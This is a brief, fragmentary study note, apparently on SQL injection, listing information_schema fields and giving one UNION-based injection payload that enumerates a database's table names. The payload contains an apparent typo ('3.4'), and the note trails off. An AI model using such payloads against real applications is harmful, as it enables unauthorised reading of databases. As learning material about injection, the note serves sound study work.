# Information\_schema

tables

table\_name

table\_schema

columns

columns\_name

x“union select 1,2,3.4 from information\_schema.tables where table\_schema=database()#

```sql
 select table_name from information_schema.tables where table_schema=database();
```

database() ⇒ DB Name

union
